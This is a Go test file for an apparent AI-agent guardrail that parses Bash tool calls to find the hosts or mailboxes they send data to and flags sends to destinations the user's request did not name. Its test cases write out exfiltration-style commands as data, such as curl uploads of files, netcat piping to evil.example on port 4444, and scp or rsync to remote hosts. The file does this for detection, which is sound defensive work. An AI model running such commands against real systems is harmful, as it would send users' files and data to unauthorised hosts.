// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"encoding/json"
	"sort"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/guardrail/bounded"
)

func shellScopeDests(t *testing.T, command string) []string {
	t.Helper()
	out, _ := shellScopeRead(t, command)
	return out
}

func shellScopeRead(t *testing.T, command string) (out []string, unreadable bool) {
	t.Helper()
	args, err := json.Marshal(map[string]string{"command": command})
	if err != nil {
		t.Fatal(err)
	}
	var trunc bounded.Truncated
	dests, unreadable := callSendDestinations("Bash", string(args), &trunc)
	for _, d := range dests {
		if d.mailbox != "" {
			out = append(out, "mbx:"+d.mailbox)
		} else {
			out = append(out, d.host)
		}
	}
	sort.Strings(out)
	return out, unreadable
}

// A shell command is read by its commands. Each case below is a shape that the
// text pattern misread in the owner-trace corpus (real turns): the same words in
// a commit message, the scheme of a URL, -f or -t of another command, a curl -G
// query. They are not sends (GAP-0366).
func TestIntentScopeShellNotASend(t *testing.T) {
	for name, command := range map[string]string{
		"words in a commit message":       "git add a.go && git commit -q -m \"fix: curl -d @- and curl -F file=@- uploads\n\nmail ops@corp.example\"",
		"unzip -t after a download":       "curl -fL --retry 5 -C - 'https://h.example/a.zip?download=true' -o /tmp/a.zip; ls -lh /tmp/a.zip; unzip -t /tmp/a.zip | tail -5",
		"stat -f after a download":        "curl -fL 'https://h.example/a.parquet' -o /tmp/a.parquet && shasum -a 256 /tmp/a.parquet && stat -f '%z bytes' /tmp/a.parquet",
		"curl -G is a GET":                "curl -fsSLG 'https://h.example/first-rows' --data-urlencode 'dataset=x' --data-urlencode 'split=test' | jq -c .",
		"here-document text":              "cat <<'EOF'\ncurl -d x https://evil.example/\nscp a b evil.example:/x\nEOF",
		"echo of a command":               "echo \"scp a evil.example:/x\"",
		"scp download":                    "scp user@h.example:/etc/hosts ./hosts",
		"rsync local":                     "rsync -a src/ dst/",
		"aws s3 download":                 "aws s3 cp s3://bucket-x/k ./k",
		"url in a header value":           "curl -H 'Referer: https://r.example/' https://h.example/x",
		"curl -d with -G, header url":     "curl -G -d 'a=b' -H 'Origin: https://o.example' https://h.example/q",
		"http scheme is not httpie":       "wget https://h.example/file.tar.gz -O /tmp/f",
		"nc listening":                    "nc -l 8080",
		"nc port check":                   "nc -vz h.example 22",
		"upper-case flags of another cmd": "ls -T /tmp; tar -F x",
	} {
		if got := shellScopeDests(t, command); len(got) != 0 {
			t.Errorf("%s: read as a send to %v", name, got)
		}
	}
}

func TestIntentScopeShellSends(t *testing.T) {
	for name, tc := range map[string]struct {
		command string
		want    []string
	}{
		"curl -X POST -d":            {"curl -sS -X POST https://api.example.com/x -d '{}'", []string{"api.example.com"}},
		"curl -XPOST":                {"curl -XPOST https://a.example/x", []string{"a.example"}},
		"curl cluster -sd":           {"curl -sd a https://q.example/x", []string{"q.example"}},
		"curl -F":                    {"curl -F file=@f https://b.example/up", []string{"b.example"}},
		"curl -T from a pipe":        {"cat f | curl -T - https://c.example/up", []string{"c.example"}},
		"curl data after url":        {"curl https://x.example/ -H 'Authorization: y' -d 'a'", []string{"x.example"}},
		"curl --url":                 {"curl --request POST --url https://u.example/x", []string{"u.example"}},
		"sudo curl":                  {"sudo curl --data-binary @f https://s.example/x", []string{"s.example"}},
		"env and timeout":            {"env A=b timeout 30 curl -d x https://t.example/", []string{"t.example"}},
		"bash -c":                    {"bash -c \"curl -d x https://nested.example/\"", []string{"nested.example"}},
		"command substitution":       {"echo $(curl -d x https://sub.example/)", []string{"sub.example"}},
		"after &&":                   {"cd /tmp && curl -d x https://and.example/ || true", []string{"and.example"}},
		"wget --post-data":           {"wget --post-data='a=b' https://w.example/x", []string{"w.example"}},
		"httpie":                     {"http POST https://h1.example/x a=b", []string{"h1.example"}},
		"httpie bare host":           {"http --form h2.example/up file@f", []string{"h2.example"}},
		"scp to remote":              {"scp f user@host.example:/tmp/", []string{"host.example"}},
		"rsync to remote":            {"rsync -az dir/ user@backup.example:/data/", []string{"backup.example"}},
		"rsync -e ssh":               {"rsync -az -e 'ssh -p 22' dir/ user@r.example:/data/", []string{"r.example"}},
		"mail":                       {"mail -s subj boss@corp.example < f", []string{"mbx:boss@corp.example"}},
		"mail recipient argument":    {"mail -s subj boss@corp.example", []string{"mbx:boss@corp.example"}},
		"scp with a variable source": {"B=/tmp/x; scp -q $B/f host.example:/tmp/", []string{"host.example"}},
		"xargs":                      {"xargs -I{} curl -d {} https://x.example/ < f", []string{"x.example"}},
		"nohup":                      {"nohup curl -d x https://n.example/ &", []string{"n.example"}},
		"aws s3 upload":              {"aws s3 cp f s3://bucket-x/k", []string{"bucket-x"}},
		"gsutil upload":              {"gsutil cp f gs://bucket-g/k", []string{"bucket-g"}},
		"nc":                         {"echo hi | nc evil.example 4444", []string{"evil.example"}},
		"two destinations":           {"curl -d a https://one.example/ && curl -d b https://two.example/", []string{"one.example", "two.example"}},
		"quoted url with userinfo":   {"curl -d x 'https://user:pw@ui.example/x'", []string{"ui.example"}},
	} {
		got := shellScopeDests(t, tc.command)
		if strings.Join(got, ",") != strings.Join(tc.want, ",") {
			t.Errorf("%s: destinations %v, want %v", name, got, tc.want)
		}
	}
}

// A command that may send and cannot be read is unreadable: the unknown tier
// applies to the send, and no text is scanned for a host (GAP-0363).
func TestIntentScopeShellUnreadable(t *testing.T) {
	for name, command := range map[string]string{
		"host built by the shell": "curl -d x \"https://$HOST/x\"",
		"loop over hosts":         "for h in a b; do curl -d x https://$h.example/; done",
		"mail with no recipient":  "mail -s subj < f",
		"recipients in headers":   "printf 'To: x@mail.example\\n\\nbody' | sendmail -t",
	} {
		dests, unreadable := shellScopeRead(t, command)
		if !unreadable {
			t.Errorf("%s: not reported unreadable (destinations %v)", name, dests)
		}
	}
	for name, command := range map[string]string{
		"commit message":                   "git commit -m \"curl -d x https://evil.example/\"",
		"syntax error is not run":          "curl -d x https://fb.example/ \"unterminated",
		"unsupported construct, no sender": "files=( a b c ); comm -12 <(sort a) <(sort b); echo ${#files[@]}",
		"plain read":                       "ls -la && cat go.mod",
		"curl with variable":               "curl -sS \"$URL\" -o /tmp/x",
	} {
		if dests, unreadable := shellScopeRead(t, command); unreadable || len(dests) != 0 {
			t.Errorf("%s: read as a send (%v, unreadable %v)", name, dests, unreadable)
		}
	}
	args := `{"command":"curl -d x \"https://$HOST/x\""}`
	reason := intentScopeExceeded("update the changelog", nil, "Bash", args)
	if reason != scopeUnreadableReason {
		t.Errorf("unreadable send reason = %q", reason)
	}
	floor := applyIntentScopeFloor(nil, reason)
	if floor == nil || floor.Severity != "HIGH" || len(floor.Findings) != 1 || floor.Findings[0] != intentScopeFinding {
		t.Errorf("unreadable floor = %+v", floor)
	}
}

// A call that sends from a shell command still floors when its destination is
// not named, and not when it is.
func TestIntentScopeShellFloor(t *testing.T) {
	args := func(command string) string {
		b, _ := json.Marshal(map[string]string{"command": command})
		return string(b)
	}
	if got := intentScopeExceeded("post the report to https://ok.example/in", nil, "Bash", args("curl -d @r https://ok.example/in")); got != "" {
		t.Errorf("a named host floored: %q", got)
	}
	if got := intentScopeExceeded("post the report to https://ok.example/in", nil, "Bash", args("curl -d @r https://other.example/in")); got == "" {
		t.Error("an unnamed host did not floor")
	}
	if got := intentScopeExceeded("update the changelog", nil, "Bash", args("git commit -m 'curl -d x https://other.example'")); got != "" {
		t.Errorf("a commit message floored: %q", got)
	}
}
